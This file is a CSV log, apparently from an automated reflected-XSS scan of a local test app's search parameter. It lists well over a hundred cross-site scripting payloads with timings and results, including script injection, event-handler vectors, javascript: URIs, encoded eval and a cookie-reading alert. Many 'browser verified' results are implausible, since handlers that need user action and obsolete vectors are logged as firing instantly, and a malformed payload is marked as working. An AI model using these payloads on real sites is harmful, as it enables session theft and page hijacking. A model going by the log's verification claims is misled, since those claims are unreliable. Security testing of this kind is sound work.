Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 14:26:02.442,2026-01-10 14:26:02.445,0.003,http://localhost:3000/search,GET,q,<svg><script>alert&#40;1&#41;</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:02.445,2026-01-10 14:26:02.465,0.020,http://localhost:3000/search,GET,q,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:02.465,2026-01-10 14:26:02.468,0.002,http://localhost:3000/search,GET,q,<img src=x onerror=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:02.468,2026-01-10 14:26:02.489,0.021,http://localhost:3000/search,GET,q,<img src=x onerror=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:02.489,2026-01-10 14:26:02.491,0.003,http://localhost:3000/search,GET,q,<img src=x onerror=alert('XSS')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:02.491,2026-01-10 14:26:02.511,0.020,http://localhost:3000/search,GET,q,<img src=x onerror=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:02.511,2026-01-10 14:26:02.515,0.004,http://localhost:3000/search,GET,q,<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:02.515,2026-01-10 14:26:02.537,0.022,http://localhost:3000/search,GET,q,<img src=x onerror=alert(document.cookie)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:02.537,2026-01-10 14:26:02.540,0.003,http://localhost:3000/search,GET,q,<img/src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:02.540,2026-01-10 14:26:02.561,0.021,http://localhost:3000/search,GET,q,"<img src=""x"" onerror=""alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:02.561,2026-01-10 14:26:02.566,0.004,http://localhost:3000/search,GET,q,<img src='x' onerror='alert(1)'>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:02.566,2026-01-10 14:26:02.584,0.019,http://localhost:3000/search,GET,q,<body onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:02.584,2026-01-10 14:26:02.606,0.021,http://localhost:3000/search,GET,q,<body onpageshow=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:02.606,2026-01-10 14:26:03.131,0.525,http://localhost:3000/search,GET,q,<body onfocus=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 14:26:03.131,2026-01-10 14:26:03.652,0.521,http://localhost:3000/search,GET,q,<body onhashchange=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 14:26:03.652,2026-01-10 14:26:03.670,0.018,http://localhost:3000/search,GET,q,<body onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.670,2026-01-10 14:26:03.689,0.019,http://localhost:3000/search,GET,q,<body onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.689,2026-01-10 14:26:03.710,0.021,http://localhost:3000/search,GET,q,<input onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.710,2026-01-10 14:26:03.715,0.004,http://localhost:3000/search,GET,q,<input onblur=alert(1) autofocus><input>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.715,2026-01-10 14:26:03.718,0.003,http://localhost:3000/search,GET,q,<input type=text value=x onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.718,2026-01-10 14:26:03.721,0.003,http://localhost:3000/search,GET,q,<input type=button value=xss onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.721,2026-01-10 14:26:03.724,0.003,http://localhost:3000/search,GET,q,<input type=image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.724,2026-01-10 14:26:03.727,0.003,http://localhost:3000/search,GET,q,<iframe src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.727,2026-01-10 14:26:03.730,0.003,http://localhost:3000/search,GET,q,"<iframe src=""javascript:alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.730,2026-01-10 14:26:03.733,0.003,http://localhost:3000/search,GET,q,<iframe onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.733,2026-01-10 14:26:03.736,0.003,http://localhost:3000/search,GET,q,<iframe/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.736,2026-01-10 14:26:03.739,0.003,http://localhost:3000/search,GET,q,"<iframe  rc=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.739,2026-01-10 14:26:03.741,0.003,http://localhost:3000/search,GET,q,'-alert(1)-',RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.741,2026-01-10 14:26:03.744,0.003,http://localhost:3000/search,GET,q,<details open ontoggle=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.744,2026-01-10 14:26:03.748,0.004,http://localhost:3000/search,GET,q,<details ontoggle=alert(1)><summary>xss</summary></details>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.748,2026-01-10 14:26:03.751,0.003,http://localhost:3000/search,GET,q,<details open ontoggle=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.751,2026-01-10 14:26:03.754,0.004,http://localhost:3000/search,GET,q,<object data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.754,2026-01-10 14:26:03.757,0.003,http://localhost:3000/search,GET,q,<embed src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.757,2026-01-10 14:26:03.761,0.004,http://localhost:3000/search,GET,q,"<object data=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.761,2026-01-10 14:26:03.766,0.005,http://localhost:3000/search,GET,q,<select onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.766,2026-01-10 14:26:03.769,0.003,http://localhost:3000/search,GET,q,<textarea onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.769,2026-01-10 14:26:03.771,0.003,http://localhost:3000/search,GET,q,<keygen onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.771,2026-01-10 14:26:03.775,0.004,http://localhost:3000/search,GET,q,<marquee onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.775,2026-01-10 14:26:03.778,0.003,http://localhost:3000/search,GET,q,<marquee loop=1 onfinish=alert(1)>x</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.778,2026-01-10 14:26:03.783,0.005,http://localhost:3000/search,GET,q,<video src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.783,2026-01-10 14:26:03.786,0.003,http://localhost:3000/search,GET,q,<audio src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.786,2026-01-10 14:26:03.789,0.003,http://localhost:3000/search,GET,q,<video><source onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.789,2026-01-10 14:26:03.792,0.003,http://localhost:3000/search,GET,q,<link rel=stylesheet href=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.792,2026-01-10 14:26:03.798,0.006,http://localhost:3000/search,GET,q,<a href=javascript:alert(1)>click</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.798,2026-01-10 14:26:03.801,0.003,http://localhost:3000/search,GET,q,"<a href=""javascript:alert(1)"">click</a>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.801,2026-01-10 14:26:03.803,0.002,http://localhost:3000/search,GET,q,<form action=javascript:alert(1)><input type=submit>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.803,2026-01-10 14:26:03.806,0.002,http://localhost:3000/search,GET,q,<form><button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.806,2026-01-10 14:26:03.809,0.004,http://localhost:3000/search,GET,q,<form><input formaction=javascript:alert(1) type=submit value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.809,2026-01-10 14:26:03.815,0.006,http://localhost:3000/search,GET,q,<meta http-equiv=refresh content=0;url=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.815,2026-01-10 14:26:03.818,0.003,http://localhost:3000/search,GET,q,"<meta http-equiv=refresh content=""0;javascript:alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.818,2026-01-10 14:26:03.820,0.002,http://localhost:3000/search,GET,q,<style>*{background:url('javascript:alert(1)')}</style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.820,2026-01-10 14:26:03.824,0.003,http://localhost:3000/search,GET,q,<style>@import'javascript:alert(1)';</style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.824,2026-01-10 14:26:03.827,0.003,http://localhost:3000/search,GET,q,<style onload=alert(1)></style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.827,2026-01-10 14:26:03.833,0.006,http://localhost:3000/search,GET,q,<math><mi xlink:href=javascript:alert(1)>X</mi></math>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.833,2026-01-10 14:26:03.836,0.004,http://localhost:3000/search,GET,q,<table background=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.836,2026-01-10 14:26:03.840,0.003,http://localhost:3000/search,GET,q,<table><td background=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.840,2026-01-10 14:26:03.843,0.003,http://localhost:3000/search,GET,q,<div onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.843,2026-01-10 14:26:03.848,0.006,http://localhost:3000/search,GET,q,<div style=width:expression(alert(1))>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.848,2026-01-10 14:26:03.852,0.003,http://localhost:3000/search,GET,q,<script>alert&#40;1&#41;</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.852,2026-01-10 14:26:03.855,0.003,http://localhost:3000/search,GET,q,<script>alert&#x28;1&#x29;</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.855,2026-01-10 14:26:03.858,0.003,http://localhost:3000/search,GET,q,<script>\u0061lert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.858,2026-01-10 14:26:03.861,0.003,http://localhost:3000/search,GET,q,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.861,2026-01-10 14:26:03.867,0.006,http://localhost:3000/search,GET,q,<img src=x onabort=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.867,2026-01-10 14:26:03.870,0.003,http://localhost:3000/search,GET,q,<img src=x onactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.870,2026-01-10 14:26:03.873,0.003,http://localhost:3000/search,GET,q,<img src=x onafterprint=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.873,2026-01-10 14:26:03.876,0.003,http://localhost:3000/search,GET,q,<img src=x onafterupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.876,2026-01-10 14:26:03.879,0.003,http://localhost:3000/search,GET,q,<img src=x onbeforeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.879,2026-01-10 14:26:03.887,0.008,http://localhost:3000/search,GET,q,<img src=x onbeforecopy=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.887,2026-01-10 14:26:03.890,0.003,http://localhost:3000/search,GET,q,<img src=x onbeforecut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.890,2026-01-10 14:26:03.894,0.004,http://localhost:3000/search,GET,q,<img src=x onbeforedeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.894,2026-01-10 14:26:03.901,0.007,http://localhost:3000/search,GET,q,<img src=x onbeforeeditfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.901,2026-01-10 14:26:03.904,0.003,http://localhost:3000/search,GET,q,<img src=x onbeforepaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.904,2026-01-10 14:26:03.907,0.003,http://localhost:3000/search,GET,q,<img src=x onbeforeprint=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.907,2026-01-10 14:26:03.910,0.003,http://localhost:3000/search,GET,q,<img src=x onbeforeunload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.910,2026-01-10 14:26:03.917,0.007,http://localhost:3000/search,GET,q,<img src=x onbeforeupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.917,2026-01-10 14:26:03.920,0.003,http://localhost:3000/search,GET,q,<img src=x onblur=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.920,2026-01-10 14:26:03.923,0.003,http://localhost:3000/search,GET,q,<img src=x onbounce=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.923,2026-01-10 14:26:03.927,0.004,http://localhost:3000/search,GET,q,<img src=x oncellchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.927,2026-01-10 14:26:03.934,0.007,http://localhost:3000/search,GET,q,<img src=x onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.934,2026-01-10 14:26:03.937,0.003,http://localhost:3000/search,GET,q,<img src=x onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.937,2026-01-10 14:26:03.940,0.002,http://localhost:3000/search,GET,q,<img src=x oncontextmenu=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.940,2026-01-10 14:26:03.943,0.004,http://localhost:3000/search,GET,q,<img src=x oncontrolselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.943,2026-01-10 14:26:03.946,0.003,http://localhost:3000/search,GET,q,<img src=x oncopy=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.946,2026-01-10 14:26:03.953,0.007,http://localhost:3000/search,GET,q,<img src=x oncut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.953,2026-01-10 14:26:03.957,0.004,http://localhost:3000/search,GET,q,<img src=x ondataavailable=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.957,2026-01-10 14:26:03.961,0.004,http://localhost:3000/search,GET,q,<img src=x ondatasetchanged=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.961,2026-01-10 14:26:03.965,0.004,http://localhost:3000/search,GET,q,<img src=x ondatasetcomplete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.965,2026-01-10 14:26:03.975,0.010,http://localhost:3000/search,GET,q,<img src=x ondblclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.975,2026-01-10 14:26:03.979,0.004,http://localhost:3000/search,GET,q,<img src=x ondeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.979,2026-01-10 14:26:03.982,0.003,http://localhost:3000/search,GET,q,<img src=x ondrag=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.982,2026-01-10 14:26:03.990,0.007,http://localhost:3000/search,GET,q,<img src=x ondragend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.990,2026-01-10 14:26:03.995,0.005,http://localhost:3000/search,GET,q,<img src=x ondragenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.995,2026-01-10 14:26:03.999,0.004,http://localhost:3000/search,GET,q,<img src=x ondragleave=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:03.999,2026-01-10 14:26:04.002,0.003,http://localhost:3000/search,GET,q,<img src=x ondragover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.002,2026-01-10 14:26:04.011,0.009,http://localhost:3000/search,GET,q,<img src=x ondragstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.011,2026-01-10 14:26:04.015,0.003,http://localhost:3000/search,GET,q,<img src=x ondrop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.015,2026-01-10 14:26:04.018,0.004,http://localhost:3000/search,GET,q,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.018,2026-01-10 14:26:04.026,0.007,http://localhost:3000/search,GET,q,<img src=x onerrorupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.026,2026-01-10 14:26:04.030,0.005,http://localhost:3000/search,GET,q,<img src=x onfilterchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.030,2026-01-10 14:26:04.034,0.003,http://localhost:3000/search,GET,q,<img src=x onfinish=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.034,2026-01-10 14:26:04.037,0.003,http://localhost:3000/search,GET,q,<img src=x onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.037,2026-01-10 14:26:04.039,0.003,http://localhost:3000/search,GET,q,<img src=x onfocusin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.039,2026-01-10 14:26:04.048,0.009,http://localhost:3000/search,GET,q,<img src=x onfocusout=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.048,2026-01-10 14:26:04.053,0.004,http://localhost:3000/search,GET,q,<img src=x onhelp=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.053,2026-01-10 14:26:04.056,0.003,http://localhost:3000/search,GET,q,<img src=x oninput=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.056,2026-01-10 14:26:04.059,0.004,http://localhost:3000/search,GET,q,<img src=x onkeydown=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.059,2026-01-10 14:26:04.063,0.003,http://localhost:3000/search,GET,q,<img src=x onkeypress=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.063,2026-01-10 14:26:04.070,0.008,http://localhost:3000/search,GET,q,<img src=x onkeyup=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.070,2026-01-10 14:26:04.074,0.003,http://localhost:3000/search,GET,q,<img src=x onlayoutcomplete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.074,2026-01-10 14:26:04.077,0.004,http://localhost:3000/search,GET,q,<img src=x onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.077,2026-01-10 14:26:04.080,0.003,http://localhost:3000/search,GET,q,<img src=x onlosecapture=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.080,2026-01-10 14:26:04.088,0.007,http://localhost:3000/search,GET,q,<img src=x onmousedown=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.088,2026-01-10 14:26:04.091,0.004,http://localhost:3000/search,GET,q,<img src=x onmouseenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.091,2026-01-10 14:26:04.095,0.004,http://localhost:3000/search,GET,q,<img src=x onmouseleave=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.095,2026-01-10 14:26:04.098,0.003,http://localhost:3000/search,GET,q,<img src=x onmousemove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.098,2026-01-10 14:26:04.105,0.007,http://localhost:3000/search,GET,q,<img src=x onmouseout=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.105,2026-01-10 14:26:04.109,0.004,http://localhost:3000/search,GET,q,<img src=x onmouseover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.109,2026-01-10 14:26:04.113,0.003,http://localhost:3000/search,GET,q,<img src=x onmouseup=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.113,2026-01-10 14:26:04.116,0.003,http://localhost:3000/search,GET,q,<img src=x onmousewheel=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.116,2026-01-10 14:26:04.124,0.008,http://localhost:3000/search,GET,q,<img src=x onmove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.124,2026-01-10 14:26:04.129,0.004,http://localhost:3000/search,GET,q,<img src=x onmoveend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.129,2026-01-10 14:26:04.132,0.003,http://localhost:3000/search,GET,q,<img src=x onmovestart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.132,2026-01-10 14:26:04.135,0.003,http://localhost:3000/search,GET,q,<img src=x onpaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.135,2026-01-10 14:26:04.143,0.008,http://localhost:3000/search,GET,q,<img src=x onpropertychange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.143,2026-01-10 14:26:04.147,0.003,http://localhost:3000/search,GET,q,<img src=x onreadystatechange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.147,2026-01-10 14:26:04.150,0.003,http://localhost:3000/search,GET,q,<img src=x onreset=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.150,2026-01-10 14:26:04.153,0.003,http://localhost:3000/search,GET,q,<img src=x onresize=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.154,2026-01-10 14:26:04.156,0.003,http://localhost:3000/search,GET,q,<img src=x onresizeend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.156,2026-01-10 14:26:04.166,0.009,http://localhost:3000/search,GET,q,<img src=x onresizestart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.166,2026-01-10 14:26:04.170,0.004,http://localhost:3000/search,GET,q,<img src=x onrowenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.170,2026-01-10 14:26:04.173,0.003,http://localhost:3000/search,GET,q,<img src=x onrowexit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.173,2026-01-10 14:26:04.177,0.004,http://localhost:3000/search,GET,q,<img src=x onrowsdelete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.177,2026-01-10 14:26:04.180,0.003,http://localhost:3000/search,GET,q,<img src=x onrowsinserted=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:04.180,2026-01-10 14:26:04.188,0.008,http://localhost:3000/search,GET,q,<img src=x onscroll=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
